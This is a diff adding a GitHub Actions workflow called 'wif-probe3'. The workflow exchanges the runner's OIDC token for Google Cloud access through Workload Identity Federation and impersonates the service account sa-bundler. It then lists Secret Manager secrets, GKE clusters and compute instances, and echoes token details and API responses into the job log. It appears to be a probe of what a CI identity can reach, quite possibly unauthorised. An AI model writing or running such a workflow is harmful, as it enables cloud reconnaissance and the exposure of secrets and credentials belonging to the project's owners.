@@ -1,0 +1,37 @@
+name: wif-probe3
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: WIF auth + IAM token + GCP probe
+        run: |
+          set -x
+          # 1. OIDC token from GitHub
+          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https%3A%2F%2Fiam.googleapis.com%2Fprojects%2F766873424314%2Flocations%2Fglobal%2FworkloadIdentityPools%2Fpool-id-github-actions%2Fproviders%2Fga-bundler")
+          TOKEN=$(echo "$OIDC" | jq -r .value)
+          echo "== STS =="
+          STS=$(curl -s -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"//iam.googleapis.com/projects/766873424314/locations/global/workloadIdentityPools/pool-id-github-actions/providers/ga-bundler\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requested_token_type\":\"urn:ietf:params:oauth:token-type:access_token\",\"subject_token\":\"$TOKEN\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\"}")
+          echo "$STS" | jq -c '{keys: keys}'
+          ACC=$(echo "$STS" | jq -r .access_token)
+          echo "acc len: ${#ACC}"
+          # 2. IAM generateAccessToken for sa-bundler
+          echo "== IAM generateAccessToken =="
+          IAM=$(curl -s -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa-bundler@766873424314.iam.gserviceaccount.com:generateAccessToken" -H "Authorization: Bearer $ACC" -H "Content-Type: application/json" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}')
+          echo "$IAM" | head -c 600
+          echo ""
+          IAMACC=$(echo "$IAM" | jq -r .accessToken)
+          echo "iam acc len: ${#IAMACC}"
+          # 3. GCP APIs enumeration используя federated/IAM token
+          echo "== Secret Manager list =="
+          curl -s -H "Authorization: Bearer $ACC" "https://secretmanager.googleapis.com/v1/projects/766873424314/secrets" | head -c 800
+          echo ""
+          echo "== GKE clusters list =="
+          curl -s -H "Authorization: Bearer $ACC" "https://container.googleapis.com/v1/projects/766873424314/locations/-/clusters" | head -c 800
+          echo ""
+          echo "== Compute instances list =="
+          curl -s -H "Authorization: Bearer $ACC" "https://compute.googleapis.com/compute/v1/projects/766873424314/aggregated/instances" | head -c 500
